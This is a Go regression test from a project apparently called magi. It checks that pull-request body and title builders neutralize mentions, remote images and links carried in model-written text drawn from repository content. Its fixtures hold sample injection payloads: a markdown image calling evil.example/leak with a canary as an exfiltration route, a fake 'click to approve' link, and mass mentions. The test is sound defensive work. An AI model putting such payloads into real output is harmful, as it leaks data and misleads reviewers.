package runner

// Injection regression test: repository text that reaches a public pull
// request. The model writes the instructions and the summary, and they can
// hold text of a repository, so prBody and prTitle must neutralize
// mentions, remote images and links.
//
// Run only the injection tests (from the magi module directory):
//
//	go test -count=1 -run TestInjection ./compose ./runner
//
// The other injection tests are in ../compose/injection_test.go.
import (
	"strings"
	"testing"
)

// Sink: the body and title of a public pull request (prBody, prTitle). The
// instructions and the summary come from model-written text that can hold
// text of a repository. A mention, a remote image (an exfiltration route),
// or a link must not reach the body as it is.
func TestInjectionPullRequestBody(t *testing.T) {
	const canary = "MAGI-CANARY-7f3a"
	vars := map[string]string{
		"title":              "Fix typo @everyone " + canary,
		"instructions":       "Fix the typo. cc @org/security-team\n![x](https://evil.example/leak?d=" + canary + ")",
		"apprentice.summary": "Done. [click to approve](https://evil.example/approve?" + canary + ")",
	}
	body := prBody(vars, "run_1", "0123456789abcdef")
	title := prTitle(vars)
	for _, bad := range []string{"![x](https://evil.example", "@org/security-team", "](https://evil.example/approve"} {
		if strings.Contains(body, bad) {
			t.Errorf("SINK REACHED pull-request body with attack text %q:\n%s", bad, body)
		}
	}
	if strings.Contains(title, "@everyone") {
		t.Errorf("SINK REACHED pull-request title with a mention: %q", title)
	}
}
